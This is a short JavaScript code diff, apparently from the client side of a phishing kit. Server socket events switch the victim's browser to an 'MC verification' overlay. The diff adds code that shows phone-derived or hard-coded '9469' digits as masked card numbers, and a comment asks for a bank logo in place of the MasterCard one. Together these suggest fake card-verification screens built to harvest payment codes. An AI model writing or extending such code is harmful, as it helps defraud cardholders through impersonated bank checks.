@@ -841,8 +841,14 @@ function setupSocketListeners() {
         }
     });
     
-    socket.on('show_mc_verification', (data) => {
-        console.log('MC verification requested:', data);
+socket.on('show_mc_verification', (data) => {
+    console.log('Showing MC verification overlay with data:', data);
+    
+    // Store the phone's last 4 digits from the data received from server
+    if (data.phoneLastFour) {
+        // Store it in the state for later use
+        state.phoneLastFour = data.phoneLastFour;
+    }
         showProcessingUI();
         
         setTimeout(() => {
@@ -1076,6 +1082,12 @@ function updateMcVerificationUI(data) {
     
     // Set currency symbol
     updateCurrencyDisplay(data.currency || 'USD');
+
+    if (document.getElementById('cardLastFourDigits')) {
+        const lastFour = data.phoneLastFour || state.phoneLastFour || '9469';
+        document.getElementById('cardLastFourDigits').textContent = `********${lastFour}`;
+    }
+
     
     // Set bank logo - ensure it shows a bank logo and not MasterCard
     const bankLogo = document.getElementById('bankLogo');
